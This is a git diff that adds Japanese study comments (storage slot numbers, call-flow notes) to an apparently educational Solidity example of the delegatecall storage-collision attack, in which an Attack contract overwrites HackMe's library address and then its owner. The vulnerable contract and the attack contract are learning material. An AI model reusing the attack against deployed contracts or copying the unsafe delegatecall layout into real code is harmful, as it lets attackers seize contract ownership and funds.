@@ -18,6 +18,8 @@ Inside attack(), the first call to doSomething() changes the address of lib
 store in HackMe. Address of lib is now set to Attack.
 The second call to doSomething() calls Attack.doSomething() and here we
 change the owner.
+
+slotの順番と型が違っていたので書き換えられる。
 */
 
 contract Lib {
@@ -29,9 +31,9 @@ contract Lib {
 }
 
 contract HackMe {
-    address public lib;
-    address public owner;
-    uint public someNumber;
+    address public lib; // slot0
+    address public owner; // slot1
+    uint public someNumber; // slot2
 
     constructor(address _lib) {
         lib = _lib;
@@ -39,6 +41,7 @@ contract HackMe {
     }
 
     function doSomething(uint _num) public {
+        // delegatecallにより dosomegthingメソッドを呼び出す。
         lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
     }
 }
@@ -50,7 +53,7 @@ contract Attack {
     address public owner;
     uint public someNumber;
 
-    HackMe public hackMe;
+    HackMe public hackMe; // slot3
 
     constructor(HackMe _hackMe) {
         hackMe = HackMe(_hackMe);
@@ -66,6 +69,8 @@ contract Attack {
 
     // function signature must match HackMe.doSomething()
     function doSomething(uint _num) public {
+        // Attack -> Hackme --> delegatecall --> Attack
+        // msg.sender = Attackになる。
         owner = msg.sender;
     }
 }
